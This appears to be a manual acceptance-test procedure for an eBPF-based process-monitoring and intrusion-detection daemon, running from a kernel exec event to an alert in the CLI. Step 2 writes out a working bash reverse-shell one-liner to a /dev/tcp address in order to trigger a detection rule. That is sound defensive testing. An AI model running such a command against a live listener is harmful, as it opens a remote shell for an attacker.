# process_collector — manual acceptance

End-to-end verification: from a kernel exec event, through the BPF ring buffer,
the Rust loader, the Python worker, the supervisor / enricher / rule-engine
pipeline, to a real Alert visible in `inspectorctl alerts list`.

## Prerequisites

- Linux 6.x x86_64 (the hard-coded task_struct offsets target this).
- Root (CAP_BPF + CAP_PERFMON + CAP_SYS_PTRACE).
- Editable install: `pip install -e '.[dev]' --no-build-isolation`.

## Procedure

1. Start the daemon in dev mode:

   ```bash
   sudo /home/eli/Development/inspectord/.venv/bin/python -m inspectord --dev \
       --base /tmp/inspd-accept &
   ```

   Wait ~3 seconds for workers to start.

2. In another terminal, trigger the LOLBin reverse-shell pattern (the listening
   side does not need to exist — we just need the exec to fire):

   ```bash
   timeout 1 bash -i >& /dev/tcp/1.2.3.4/4444 0>&1 || true
   ```

3. Wait 2 seconds for the rule engine to fire.

4. Query alerts via the CLI:

   ```bash
   /home/eli/Development/inspectord/.venv/bin/inspectorctl \
       --socket /tmp/inspd-accept/var/inspectord.sock alerts list
   ```

   Expected output (severity may vary):

   ```
   id          when                     severity  rule                  process            host
   ----------  -----------------------  --------  --------------------  -----------------  --------
   <uuid>      2026-05-25T..:..:..Z     high      lolbin.bash_dev_tcp   bash (<pid>)       <hostname>
   ```

5. Optional: open the web dashboard and verify the alert appears in /alerts.

   ```bash
   /home/eli/Development/inspectord/.venv/bin/inspectorctl-web \
       --socket /tmp/inspd-accept/var/inspectord.sock --port 8765 &
   xdg-open http://127.0.0.1:8765/alerts
   ```

6. Cleanup:

   ```bash
   sudo killall -INT python || true
   rm -rf /tmp/inspd-accept
   ```

## Troubleshooting

- **`process_collector` keeps restarting**: check the supervisor log for
  "permission denied" — confirm sudo (or AmbientCapabilities for the systemd
  unit).
- **No alert fires** but the journal has records: `inspectorctl rules list`
  should show `lolbin.bash_dev_tcp` as `active`.
- **No records in the journal**: hard-coded task_struct offsets may be wrong
  for your kernel. Run
  `bpftool btf dump file /sys/kernel/btf/vmlinux format c | grep -A300 'struct task_struct '`
  and verify offsets. A CO-RE BTF migration is on the Phase 2 roadmap.
